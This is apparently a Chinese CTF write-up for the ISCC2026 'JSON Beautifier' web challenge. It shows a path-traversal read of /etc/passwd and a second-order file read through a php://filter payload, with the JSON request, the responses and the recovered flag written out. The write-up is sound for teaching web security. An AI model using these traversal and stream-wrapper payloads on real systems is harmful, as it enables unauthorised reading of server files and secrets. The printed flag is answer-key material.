+++
title = "JSON Beautifier"
date = "2026-05-06"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++
题目是一个 “JSON 美化 + 预览” 小工具，首页提交数据到 `/api/beautify.php`，返回一个临时预览文件名。最先可以用最简单的输入验证功能：

```json
{"data":"{\"a\":1}","preview_type":"raw"}
```

返回类似：

```json
{
  "success": true,
  "preview_id": "preview_xxxxxxxx",
  "preview_file": "preview_xxxxxxxx.tmp"
}
```

然后访问：

```text
/api/preview.php?file=preview_xxxxxxxx.tmp
```

可以读到刚才写入的内容，说明这里存在一个“读取临时预览文件”的接口。进一步访问 `/robots.txt`，里面明确提示了 `/api/preview.php` 和 `/api/beautify.php`，说明关键逻辑就在这两个文件。

接下来要判断 `preview.php` 是“读取文件”还是“包含执行文件”。构造目录穿越去读诸如 `../../etc/passwd`，会发现它只是把文件内容读出来，不会执行 PHP 代码，所以这题核心不是文件包含 RCE，而是文件读取逻辑的二次利用。根据响应头还能看到：

```text
X-DocRoot: /path/to/src/
```

结合题目行为，可以继续想办法读源码，进而分析 `/api/preview.php` 和 `/api/beautify.php` 的实现。

核心漏洞点在 `preview.php` 的逻辑。它先读取我们指定的临时预览文件内容，大致相当于：

```php
$content = file_get_contents($real);
```

然后按行处理内容，取出形如 `scheme://...` 的 scheme：

```php
$scheme = schemeOf($line);
```

它只过滤了少数危险协议，比如：

```php
http, https, ftp, ftps, phar, expect
```

但没有过滤 `php://`。之后如果识别到这一行是一个“资源引用”，又会再次执行：

```php
$data = @file_get_contents($line);
```

这就是漏洞关键：虽然我们最开始只能写一个普通文本预览文件，但 `preview.php` 会把这个文本内容再次当作路径/流包装器去读取，形成二次文件读取。

因此利用方式很直接：通过 `/api/beautify.php` 生成一个内容为下面这行的临时预览文件：

```text
php://filter/read=convert.base64-encode/resource=/secret/flag
```

为了符合接口要求，可以用 `data_uri` 模式提交：

```json
{
  "data": "data:text/plain;base64,cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS9zZWNyZXQvZmxhZw==",
  "preview_type": "data_uri"
}
```

服务端返回一个新的 `preview_file`，例如：

```json
{
  "success": true,
  "preview_id": "preview_3bd17163ca969ce6",
  "preview_file": "preview_3bd17163ca969ce6.tmp"
}
```

然后访问：

```text
/api/preview.php?file=preview_3bd17163ca969ce6.tmp
```

返回内容为：

```text
SVNDQ3tCVlptWkY2YnZteGhLVFk0Mm1LaH0K
```

这是 base64，解码即可得到 flag：

```text
ISCC{BVZmZF6bvmxhKTY42mKh}
```

**最终 flag**

```text
ISCC{BVZmZF6bvmxhKTY42mKh}
```
